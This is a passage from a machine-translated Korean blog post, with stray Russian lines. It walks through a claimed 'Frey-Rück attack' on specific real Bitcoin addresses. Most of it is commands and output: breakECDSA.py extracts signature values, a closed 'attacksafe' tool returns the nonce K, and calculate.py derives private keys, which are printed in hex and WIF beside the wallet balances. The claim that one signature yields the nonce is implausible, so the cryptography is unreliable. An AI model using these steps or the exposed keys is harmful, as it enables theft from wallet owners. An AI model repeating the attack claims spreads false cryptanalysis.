K = 0xad004724cdf368d6ffcc49791827c9157f533a53e687d7eae1547c848d49e1cd
R = 0x481b75700708a950ce88c97a84d7eef9844642ae0406db86c6384da093b22996
S = 0xabd9db597dbaaf4866e8379fd1127c017fa904756e7aa8559831c75bd925037a
Z = 0x6bd83b8efbba3aaeea89f4763a13f837181c42c82dfb223d8354f109b5ec65fe


print (h((((S * K) - Z) * modinv(R,N)) % N))</code></pre>
<!-- /wp:code -->

<!-- wp:heading -->
<h2>스크립트는 다음 공식을 사용하여 개인 키를 계산합니다.</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>스크립트를 실행해 봅시다:</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>python3 calculate.py</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1064} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-85.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-1064"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><code>PrivKey = 4d063c9a389df945ede5fa1a5d19408944d74d449d722548b3d8c80606e05b06</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">bitaddress를</a></strong>&nbsp;열고&nbsp;다음을 확인합니다.</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>ADDR: 12Pm2muhQKuVtAHwJzdaiSLRa9QxgLpx5Q
WIF:  KyoSFYtgbsWxtfFZmMfbkwFTXhqfGgxztVgmuN1dFrPqs3nFCqcr
HEX:  4d063c9a389df945ede5fa1a5d19408944d74d449d722548b3d8c80606e05b06</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":886} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/a4.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-886"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:embed {"url":"https://www.blockchain.com/btc/address/12Pm2muhQKuVtAHwJzdaiSLRa9QxgLpx5Q"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://www.blockchain.com/btc/address/12Pm2muhQKuVtAHwJzdaiSLRa9QxgLpx5Q
</div></figure>
<!-- /wp:embed -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><code>Приватный ключ найден!</code></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":889} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-23-1024x450.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-889"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><code>BALANCE: $ 706.27</code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong><code>№5</code></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>자세한 암호 분석을 통해 Bitcoin 주소에서 치명적인 취약점도 발견했습니다.</p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong><a href="https://btc1.trezor.io/address/19BRiDqZfYxU4K3DCWAfbh925cr7L4Q8ac" target="_blank" rel="noreferrer noopener">19BRiDqZfYxU4K3DCWafbh925cr7L4Q8ac</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:embed {"url":"https://btc1.trezor.io/tx/492955688cff583fa5b6677bcb9a90a3010925f7e2204fd464e0e7183a6954db"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://btc1.trezor.io/tx/492955688cff583fa5b6677bcb9a90a3010925f7e2204fd464e0e7183a6954db
</div></figure>
<!-- /wp:embed -->

<!-- wp:embed {"url":"https://btc1.trezor.io/tx/e3dfc0d3b61972d04446214481d8e54623e5e0f2aaf26d7bc01fe5081249b4ea"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://btc1.trezor.io/tx/e3dfc0d3b61972d04446214481d8e54623e5e0f2aaf26d7bc01fe5081249b4ea
</div></figure>
<!-- /wp:embed --></blockquote>
<!-- /wp:quote -->

<!-- wp:image {"id":673} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-9.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-673"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":675} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-10.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-675"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2>공격을 위한 RawTX 준비</h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong><a href="https://btc1.trezor.io/address/19BRiDqZfYxU4K3DCWAfbh925cr7L4Q8ac" target="_blank" rel="noreferrer noopener">19BRiDqZfYxU4K3DCWafbh925cr7L4Q8ac</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:embed {"url":"https://btc1.trezor.io/tx/492955688cff583fa5b6677bcb9a90a3010925f7e2204fd464e0e7183a6954db"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://btc1.trezor.io/tx/492955688cff583fa5b6677bcb9a90a3010925f7e2204fd464e0e7183a6954db
</div></figure>
<!-- /wp:embed --></blockquote>
<!-- /wp:quote -->

<!-- wp:image {"id":908} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-25-1024x94.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-908"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>RawTX = 0100000001b5bdf3eeeb068c2ca42bd8f65fc617875ab556afcff4a3de307674be180a7ab3070000006a47304402202bf4a846fe0d4c967c15a90eb56365576e42563b7257cbc280def5936817ec4e022054cb84ac0ce9a6e2e4cbc22f814f1d83c4ef04d55da730761d202158bdb690580121023a936a1116ee1d51eceef530daf519824a89a3985c9eaa1c58cfcd2c78830903ffffffff010000000000000000046a02445300000000
</code></pre>
<!-- /wp:code -->

<!-- wp:heading -->
<h2>이제 모든 취약한 트랜잭션에서 모든 R, S, Z 값을 가져와야 합니다.</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>breakECDSA.py 스크립트를 사용해봅시다.</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>python2 breakECDSA.py 0100000001b5bdf3eeeb068c2ca42bd8f65fc617875ab556afcff4a3de307674be180a7ab3070000006a47304402202bf4a846fe0d4c967c15a90eb56365576e42563b7257cbc280def5936817ec4e022054cb84ac0ce9a6e2e4cbc22f814f1d83c4ef04d55da730761d202158bdb690580121023a936a1116ee1d51eceef530daf519824a89a3985c9eaa1c58cfcd2c78830903ffffffff010000000000000000046a02445300000000
</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1067} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-86-1024x253.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-1067"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>R = 0x2bf4a846fe0d4c967c15a90eb56365576e42563b7257cbc280def5936817ec4e
S = 0x54cb84ac0ce9a6e2e4cbc22f814f1d83c4ef04d55da730761d202158bdb69058
Z = 0x4af38c561f0c46e2b0e78d5ab4aae0c82dc3f0affb15717064d8c63ee0c9330e</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>취약한 ECDSA 서명 트랜잭션에서 비밀 키를 얻기 위해 데이터를&nbsp;<code>RawTX</code>텍스트 문서에 추가하고 파일로 저장해 봅시다.<code>RawTX.txt</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>0100000001b5bdf3eeeb068c2ca42bd8f65fc617875ab556afcff4a3de307674be180a7ab3070000006a47304402202bf4a846fe0d4c967c15a90eb56365576e42563b7257cbc280def5936817ec4e022054cb84ac0ce9a6e2e4cbc22f814f1d83c4ef04d55da730761d202158bdb690580121023a936a1116ee1d51eceef530daf519824a89a3985c9eaa1c58cfcd2c78830903ffffffff010000000000000000046a02445300000000</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2><code>-tool frey_ruck_attack</code>소프트웨어를 사용하여&nbsp;실행<code>“ATTACKSAFE SOFTWARE”</code></h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>./attacksafe -tool frey_ruck_attack -open RawTX.txt -save SecretKey.txt</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1069} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-87-1024x318.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-1069"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>우리는 이 공격을 시작했고&nbsp;<code>-tool frey_ruck_attack</code>그 결과는 파일에 저장되었습니다.<code>SecretKey.txt</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>이제 성공적인 결과를 보려면 파일을 엽니다.<code>SecretKey.txt</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>cat SecretKey.txt</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1070} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-88-1024x453.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-1070"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>Deployments ECDSA:

SecretKey = 0xb1f4054cff1df58822bb4085f7fb23c95c37bdd037dc1df01be68a8ca85f6d55

RawTX = 0100000001b5bdf3eeeb068c2ca42bd8f65fc617875ab556afcff4a3de307674be180a7ab3070000006a47304402202bf4a846fe0d4c967c15a90eb56365576e42563b7257cbc280def5936817ec4e022054cb84ac0ce9a6e2e4cbc22f814f1d83c4ef04d55da730761d202158bdb690580121023a936a1116ee1d51eceef530daf519824a89a3985c9eaa1c58cfcd2c78830903ffffffff010000000000000000046a02445300000000</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><code>"Deployments ECDSA"</code>우리는 비트코인 ​​블록체인 트랜잭션의 치명적인 취약점을 의미하는&nbsp;비문을 봅니다 .</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>SecretKey значение в формате HEX, это и есть наш секретный ключ "K" (NONCE):</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>K = 0xb1f4054cff1df58822bb4085f7fb23c95c37bdd037dc1df01be68a8ca85f6d55</code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2><em>파이썬</em>&nbsp;스크립트&nbsp;로 확인하자<code>point2gen.py</code></h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>ECPy</strong></a>&nbsp;타원 곡선 라이브러리를 사용해 봅시다&nbsp;.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>이제 다음을 지정하여 스크립트를 실행해 보겠습니다&nbsp;<code>секретный ключ "K" (NONCE)</code>.</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>python3 point2gen.py 0xb1f4054cff1df58822bb4085f7fb23c95c37bdd037dc1df01be68a8ca85f6d55</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1075} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-89-1024x98.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-1075"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><code>(0x2bf4a846fe0d4c967c15a90eb56365576e42563b7257cbc280def5936817ec4e , 0x8df094a6760490d279c350cf34f5ae35fd6cfea9dafd63d02d500e01ca67bcb3)</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>EC (secp256k1)&nbsp;</code>시그니처 값으로&nbsp;포인트 좌표 확인<code>R</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>R = 0x2bf4a846fe0d4c967c15a90eb56365576e42563b7257cbc280def5936817ec4e
S = 0x54cb84ac0ce9a6e2e4cbc22f814f1d83c4ef04d55da730761d202158bdb69058
Z = 0x4af38c561f0c46e2b0e78d5ab4aae0c82dc3f0affb15717064d8c63ee0c9330e</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>R          =    0x2bf4a846fe0d4c967c15a90eb56365576e42563b7257cbc280def5936817ec4e
point2gen  =   (0x2bf4a846fe0d4c967c15a90eb56365576e42563b7257cbc280def5936817ec4e , 0x8df094a6760490d279c350cf34f5ae35fd6cfea9dafd63d02d500e01ca67bcb3)
</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><code>ВСЕ ВЕРНО!</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>K = 0xb1f4054cff1df58822bb4085f7fb23c95c37bdd037dc1df01be68a8ca85f6d55</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>이제 비밀 키를 알고 있으므로 비트코인 ​​지갑에 대한 개인 키를 얻을 수 있습니다.<code>19BRiDqZfYxU4K3DCWAfbh925cr7L4Q8ac</code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2><em>Python</em>&nbsp;스크립트를 사용합시다&nbsp;&nbsp;.&nbsp;&nbsp;<code>calculate.py</code>&nbsp;&gt; &gt; &gt; 개인 키 가져오기</h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>코드를 열고 서명의 모든 값을 추가합시다<code><strong>K, R, S, Z</strong></code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


K = 0xb1f4054cff1df58822bb4085f7fb23c95c37bdd037dc1df01be68a8ca85f6d55
R = 0x2bf4a846fe0d4c967c15a90eb56365576e42563b7257cbc280def5936817ec4e
S = 0x54cb84ac0ce9a6e2e4cbc22f814f1d83c4ef04d55da730761d202158bdb69058
Z = 0x4af38c561f0c46e2b0e78d5ab4aae0c82dc3f0affb15717064d8c63ee0c9330e


print (h((((S * K) - Z) * modinv(R,N)) % N))</code></pre>
<!-- /wp:code -->

<!-- wp:heading -->
<h2>스크립트는 다음 공식을 사용하여 개인 키를 계산합니다.</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>스크립트를 실행해 봅시다:</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>python3 calculate.py</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1078} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-90.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-1078"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><code>PrivKey = 4c708ac0c78e07552f14544758031d2ad9d0baee702b5b163b97f1e7200c007b</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">bitaddress를</a></strong>&nbsp;열고&nbsp;다음을 확인합니다.</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>ADDR: 19BRiDqZfYxU4K3DCWAfbh925cr7L4Q8ac
WIF:  KynJKoLwF9vk8yV5HaEybRcmjQhV938rjKt5kV6A7omrVipvk9ve
HEX:  4c708ac0c78e07552f14544758031d2ad9d0baee702b5b163b97f1e7200c007b</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":912} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/a5.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-912"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:embed {"url":"https://www.blockchain.com/btc/address/19BRiDqZfYxU4K3DCWAfbh925cr7L4Q8ac"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://www.blockchain.com/btc/address/19BRiDqZfYxU4K3DCWAfbh925cr7L4Q8ac
</div></figure>
<!-- /wp:embed -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><code>Приватный ключ найден!</code></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":914} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-26-1024x444.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-914"/><figcaption class="wp-element-caption"><strong><code>www.blockchain.com/btc/address/19BRiDqZfYxU4K3DCWAfbh925cr7L4Q8ac</code></strong></figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><code>BALANCE: $ 702.32</code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>BTC 코인을 잃을 수 있는 잠재적인 위협은 비트코인 ​​블록체인 트랜잭션의 치명적인 취약점에 있기 때문에 모든 사람이 항상 소프트웨어를 업데이트하고 검증된 장치만 사용할 것을 강력히 권장합니다.</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong><a href="https://btc1.trezor.io/tx/e3dfc0d3b61972d04446214481d8e54623e5e0f2aaf26d7bc01fe5081249b4ea" target="_blank" rel="noreferrer noopener">자세한 암호 분석을 통해 e3dfc0d3b61972d04446214481d8e54623e5e0f2aaf26d7bc01fe5081249b4ea</a></strong>&nbsp;에서 동일한 비트코인 ​​주소에 대한&nbsp;치명적인 취약점도 발견했습니다.<strong><code>&nbsp;TXID:</code></strong><strong><a href="https://btc1.trezor.io/tx/e3dfc0d3b61972d04446214481d8e54623e5e0f2aaf26d7bc01fe5081249b4ea" target="_blank" rel="noreferrer noopener"></a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2>공격을 위한 RawTX 준비</h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong><a href="https://btc1.trezor.io/address/19BRiDqZfYxU4K3DCWAfbh925cr7L4Q8ac" target="_blank" rel="noreferrer noopener">19BRiDqZfYxU4K3DCWafbh925cr7L4Q8ac</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:embed {"url":"https://btc1.trezor.io/tx/e3dfc0d3b61972d04446214481d8e54623e5e0f2aaf26d7bc01fe5081249b4ea"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://btc1.trezor.io/tx/e3dfc0d3b61972d04446214481d8e54623e5e0f2aaf26d7bc01fe5081249b4ea
</div></figure>
<!-- /wp:embed --></blockquote>
<!-- /wp:quote -->

<!-- wp:image {"id":917} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-27-1024x97.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-917"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>RawTX = 010000000133bfe125d6fc3f79b0dbd7f331b74bc48c622a40041cf1c5d12659d8cbac77b21f0000006b483045022100902909cb474b429661adaa481a872638e24c93d8bd61394f30d709c44d529c1e022001bf247ad7e81871e9ee2acfc445c7716393e900ff7018727415fe3f553d6edc0121023a936a1116ee1d51eceef530daf519824a89a3985c9eaa1c58cfcd2c78830903ffffffff010000000000000000016a00000000
</code></pre>
<!-- /wp:code -->

<!-- wp:heading -->
<h2>이제 모든 취약한 트랜잭션에서 모든 R, S, Z 값을 가져와야 합니다.</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>breakECDSA.py 스크립트를 사용해봅시다.</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>python2 breakECDSA.py 010000000133bfe125d6fc3f79b0dbd7f331b74bc48c622a40041cf1c5d12659d8cbac77b21f0000006b483045022100902909cb474b429661adaa481a872638e24c93d8bd61394f30d709c44d529c1e022001bf247ad7e81871e9ee2acfc445c7716393e900ff7018727415fe3f553d6edc0121023a936a1116ee1d51eceef530daf519824a89a3985c9eaa1c58cfcd2c78830903ffffffff010000000000000000016a00000000
</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1080} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-91-1024x254.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-1080"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>R = 0x902909cb474b429661adaa481a872638e24c93d8bd61394f30d709c44d529c1e
S = 0x01bf247ad7e81871e9ee2acfc445c7716393e900ff7018727415fe3f553d6edc
Z = 0x74bd6032e6bfd019a0760d799efc145c34b9a5d58e9f974f9a60756890dc6288</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>취약한 ECDSA 서명 트랜잭션에서 비밀 키를 얻기 위해 데이터를&nbsp;<code>RawTX</code>텍스트 문서에 추가하고 파일로 저장해 봅시다.<code>RawTX.txt</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>010000000133bfe125d6fc3f79b0dbd7f331b74bc48c622a40041cf1c5d12659d8cbac77b21f0000006b483045022100902909cb474b429661adaa481a872638e24c93d8bd61394f30d709c44d529c1e022001bf247ad7e81871e9ee2acfc445c7716393e900ff7018727415fe3f553d6edc0121023a936a1116ee1d51eceef530daf519824a89a3985c9eaa1c58cfcd2c78830903ffffffff010000000000000000016a00000000</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2><code>-tool frey_ruck_attack</code>소프트웨어를 사용하여&nbsp;실행<code>“ATTACKSAFE SOFTWARE”</code></h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>./attacksafe -tool frey_ruck_attack -open RawTX.txt -save SecretKey.txt</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1082} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-92-1024x310.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-1082"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>우리는 이 공격을 시작했고&nbsp;<code>-tool frey_ruck_attack</code>그 결과는 파일에 저장되었습니다.<code>SecretKey.txt</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>이제 성공적인 결과를 보려면 파일을 엽니다.<code>SecretKey.txt</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>cat SecretKey.txt</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1084} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-93-1024x453.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-1084"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>Deployments ECDSA:

SecretKey = 0x0a27007da4d867c8ec6847cab32e8b8c38f5df48ec73847d355b4c7479970b99

RawTX = 010000000133bfe125d6fc3f79b0dbd7f331b74bc48c622a40041cf1c5d12659d8cbac77b21f0000006b483045022100902909cb474b429661adaa481a872638e24c93d8bd61394f30d709c44d529c1e022001bf247ad7e81871e9ee2acfc445c7716393e900ff7018727415fe3f553d6edc0121023a936a1116ee1d51eceef530daf519824a89a3985c9eaa1c58cfcd2c78830903ffffffff010000000000000000016a00000000</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><code>"Deployments ECDSA"</code>우리는 비트코인 ​​블록체인 트랜잭션의 치명적인 취약점을 의미하는&nbsp;비문을 봅니다 .</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>SecretKey значение в формате HEX, это и есть наш секретный ключ "K" (NONCE):</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>K = 0x0a27007da4d867c8ec6847cab32e8b8c38f5df48ec73847d355b4c7479970b99</code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2><em>파이썬</em>&nbsp;스크립트&nbsp;로 확인하자<code>point2gen.py</code></h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>ECPy</strong></a>&nbsp;타원 곡선 라이브러리를 사용해 봅시다&nbsp;.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>이제 다음을 지정하여 스크립트를 실행해 보겠습니다&nbsp;<code>секретный ключ "K" (NONCE)</code>.</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>python3 point2gen.py 0x0a27007da4d867c8ec6847cab32e8b8c38f5df48ec73847d355b4c7479970b99</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1087} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-94-1024x91.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-1087"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
